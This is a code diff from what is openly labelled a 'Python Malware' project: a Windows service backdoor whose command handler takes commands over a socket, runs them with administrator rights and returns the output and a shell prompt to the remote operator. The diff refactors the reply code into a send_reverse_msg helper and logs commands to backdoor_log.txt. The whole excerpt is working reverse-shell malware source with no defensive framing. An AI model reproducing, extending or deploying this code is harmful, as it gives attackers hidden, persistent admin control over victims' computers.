@@ -1,13 +1,12 @@
 from local_libs import service
-from local_libs.config import Config
 import servicemanager
 import sys
 
 import os
 import time
 import socket
-import signal
 import win32comext.shell.shell as shell
+from local_libs.config import Config
 
 import win32ts
 import win32profile
@@ -25,8 +24,8 @@ class Main(service.WinService):
         super().__init__(args)
         self.is_running = False
 
-        self.commands_log_filepath = r"C:\Users\User\Desktop\backdoor_log.txt"
         self.service_log_filepath = r"C:\Users\User\Desktop\service_log.txt"
+        self.commands_log_filepath = r"C:\Users\User\Desktop\backdoor_log.txt"
         self.config_filepath = r"D:\PROJECTS\PycharmProjects\Python Malware\config.json"
 
         self.s = None
@@ -68,23 +67,26 @@ class Main(service.WinService):
 
     def handle_command(self, command):
         if command == "start shell":
-            self.s.send(f"{os.getcwd()} >> ".encode("utf-8"))
+            self.send_reverse_msg("")
         elif command == "hello":
             pass
         elif command[:2] == "cd":
             try:
                 os.chdir(command[3:])
-                self.s.send(f"{os.getcwd()} >> ".encode("utf-8"))
+                self.send_reverse_msg("")
             except Exception as error:
-                self.s.send(f"Error: {error}\n{os.getcwd()} >> ".encode("utf-8"))
+                self.send_reverse_msg(f"Error: {error}\n")
         else:
             try:
                 self.execute_admin_cmd(command)
                 time.sleep(0.5)
                 cmd_output = self.get_cmd_output()
-                self.s.send(f"{cmd_output}\nSuccessfully executed\n{os.getcwd()} >> ".encode("utf-8"))
+                self.send_reverse_msg(f"{cmd_output}\nSuccessfully executed\n")
             except Exception as error:
-                self.s.send(f"Error: {error}\n{os.getcwd()} >> ".encode("utf-8"))
+                self.send_reverse_msg(f"Error: {error}\n")
+
+    def send_reverse_msg(self, msg):
+        self.s.send(f"{msg}{os.getcwd()} >> ".encode("utf-8"))
 
     def execute_user_cmd(self, command):
         console_session_id = win32ts.WTSGetActiveConsoleSessionId()
